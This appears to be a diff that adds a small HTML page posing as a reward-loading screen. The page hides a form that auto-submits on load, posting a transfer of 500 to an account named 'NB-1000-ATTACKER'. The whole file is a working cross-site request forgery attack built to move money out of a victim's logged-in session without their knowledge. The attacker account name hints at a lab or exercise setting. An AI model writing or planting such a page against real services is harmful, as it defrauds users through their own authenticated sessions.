@@ -1,0 +1,11 @@
+<!doctype html>
+<html>
+<body>
+<p>Loading your reward...</p>
+<form id="csrf" action="/transfer" method="POST">
+<input type="hidden" name="to" value="NB-1000-ATTACKER">
+<input type="hidden" name="amount" value="500">
+</form>
+<script>document.getElementById('csrf').submit()</script>
+</body>
+</html>
